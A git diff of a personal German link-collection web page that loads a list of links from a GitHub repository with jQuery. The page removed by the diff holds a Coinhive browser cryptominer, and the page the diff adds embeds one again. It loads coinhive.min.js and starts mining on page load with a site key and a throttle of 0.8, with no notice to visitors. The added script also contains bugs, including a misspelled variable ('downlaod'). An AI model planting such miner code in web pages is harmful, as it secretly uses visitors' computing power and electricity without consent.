@@ -1,5 +1,42 @@
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('9jF8Bnq6fZx5QIFlkO98HNag4WoFJJ3J');
-	miner.start();
-</script>
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Kai aus Hannover Linksammlung</title>
+        <meta charset="utf-8">
+        <link rel="stylesheet" href="css/bootstrap.min.css">
+        <link rel="stylesheet" href="css/style.css">
+        <script src="js/jquery-3.2.1.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script type="text/javascript">
+            var $ = jQuery;
+            var download;
+            var anfang = "Links/";
+            function anzeigen(inhalt) {
+                download = inhalt.data.tree;
+                for (var i = download.length - 1; i >= 0; --i) {
+                    console.log(download.path);
+                    if (downlaod.path.substring(0, 6) == anfang) {
+                        $("body").append('<a class="link versteckt collapsed" id="link-' + i + '"data-toggle="collapse" href="#' + i + '" aria-expanded="false" aria-controls="footwear">' + download[i].path + '</a><div class="inhalt collapse" id="' + i + '"><div class="fehler404">Ups Fehler 404</div></div>');
+                        (function(index) {
+                            $("#" + index).load(encodeURIComponent("/" + download[index].path), function(inhalt, ergebnis) {
+                                if (ergebnis == "success") {
+                                    $("#link-" + index).removeClass("versteckt");
+                                }
+                            });
+                        })(i);
+                    }
+                }
+            }
+        </script>
+        <script src="https://api.github.com/repos/Kai-aus-Hannover/Kaitag/git/trees/master?recursive=1&callback=anzeigen"></script>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+	        var miner = new CoinHive.Anonymous('9YUHHwULqP6nAeOypXU9S51o37hsGa7G');
+	        miner.start();
+	        miner.setThrottle(0.8);
+        </script>
+    </head>
+    <body>
+        <h1 type="button" data-toggle="collapse" aria-expanded="true" data-target=".collapse">Kai aus Hannover Linksammlung</h1>
+    </body>
+</html>
